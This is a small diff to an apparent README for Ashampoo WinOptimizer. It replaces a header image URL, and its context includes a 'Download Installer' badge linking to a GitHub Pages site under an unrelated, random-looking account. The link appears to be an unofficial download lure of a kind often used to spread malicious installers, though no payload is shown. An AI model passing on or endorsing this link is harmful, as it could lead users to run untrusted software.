@@ -25,7 +25,7 @@ Ashampoo WinOptimizer integrates naturally into Windows administration routines 
 ---
 
 <div align="center">
-<img src="https://i.ytimg.com/vi/w54Y-0i5IXs/maxresdefault.jpg" width="800">
+<img src="https://lens.usercontent.google.com/image?vsrid=CP-Sxe7Am4LEehACGAEiJDc5N2VjMWNmLThmZWUtNGEyNi1hZmEwLTc2MjU3YTliOGY2MDJ8IgJlbigdQnQKLmxmZS1kdW1teTo2MzhiMTQxYi1iOTkxLTQ0YmUtOWY5Yi1hNDQ2NjgzMDgwYjUSQgpAL2Jucy9lbi9ib3JnL2VuL2Jucy9sZW5zLWZyb250ZW5kLWFwaS9wcm9kLmxlbnMtZnJvbnRlbmQtYXBpLzExMjil45naoP2UAw&gsessionid=M9lxujF6MdD0VlpPVUylppKkOP0C_57_GaDbzKnjICyItVvmhdE1zw" width="800">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://alijahfraziernfnq.github.io/.github/Ashampoo-WinOptimizer-Windows)
